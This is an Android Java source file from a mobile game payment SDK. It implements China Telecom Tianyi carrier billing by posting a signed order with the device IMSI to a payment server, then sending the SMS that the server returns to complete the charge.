package mobi.zty.pay.sdk.tianyiFee;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * 天翼空间 支付管理类
 * @author Administrator
 *
 */
public class TianYiFeeInstance extends PaymentInterf{
	private static TianYiFeeInstance instance;
	private Handler callBHandler = null;
	public static TianYiFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized TianYiFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new TianYiFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String out_trade_no = (String) parameters[0];
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		Helper.sendPayMessageToServer(PayConfig.TC_FEE, "进入支付：", feeIndex);
		final String seller_key = mkInfo.spIdentify;
		final String fee = feeInfo.consume+"";
		final String imsi = Helper.getIMSI(context);
		final String app_name = mkInfo.appName;
		final String pay_url = mkInfo.payUrl1;
		final String secret = mkInfo.spKey;
		
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					try {
						String express = "app_name="+URLEncoder.encode(app_name, "UTF-8")+"&fee="+fee+"&imsi="+imsi+
								"&out_trade_no="+out_trade_no+"&seller_key="+seller_key;
						String sign = Helper.md5(express+secret);
//						String url = pay_url+"?"+express+"&sign="+sign;
						Map<String, String> mapEnty = new HashMap<String, String>();
						mapEnty.put("app_name", URLEncoder.encode(app_name, "UTF-8"));
						mapEnty.put("fee", fee);
						mapEnty.put("imsi", imsi);
						mapEnty.put("out_trade_no", out_trade_no);
						mapEnty.put("seller_key", seller_key);
						mapEnty.put("sign", sign);
						Helper.sendPayMessageToServer(PayConfig.TC_FEE, "执行支付：pay_url"+pay_url, feeIndex);
						String requestResponse = HttpRequestt.post(pay_url, mapEnty, true).body();
//						String requestResponse = reqTianYiPay(pay_url,postData);
						boolean isSendMsg = false;
						if (requestResponse!=null && requestResponse!="") {
							Helper.sendPayMessageToServer(PayConfig.TC_FEE, "执行支付响应："+requestResponse, feeIndex);
							JSONObject ret = new JSONObject(requestResponse);
							if (ret.getString("code").equals("1")) {//订单获取成
								JSONArray jsonArray = new JSONArray(ret.getString("msg"));
								for (int i = 0; i < jsonArray.length(); i++) {
									JSONObject result = (JSONObject) jsonArray.get(i);
									String trade_NO = result.getString("out_trade_no");
									if (out_trade_no.equals(trade_NO)) {//如果订单不对 不做处理
										String send_num = result.getString("sender_number");
										String sms_content = result.getString("message_content");
										Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
										itSend.putExtra("fee_index", feeIndex);
								        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
								        Util_G.sendTextMessage(context, send_num, sms_content, mSendPI, 0);
								        Util_G.debugE("dianxin_pay", "pay_data->"+sms_content+"  feeIndex->"+feeIndex);
								        isSendMsg = true;
								        Helper.sendPayMessageToServer(PayConfig.TC_FEE, "响应成功发送短信：sms_content="+sms_content, feeIndex);
									}
								}
								
							}
						} 
						if (!isSendMsg) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "支付失败";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							Helper.sendPayMessageToServer(PayConfig.TC_FEE, "响应失败", feeIndex);
							return;
						}
				    	
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "支付失败";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
						Helper.sendPayMessageToServer(PayConfig.TC_FEE, "执行支付异常", feeIndex);
					}
				}
			}).start();;
	}
	
}
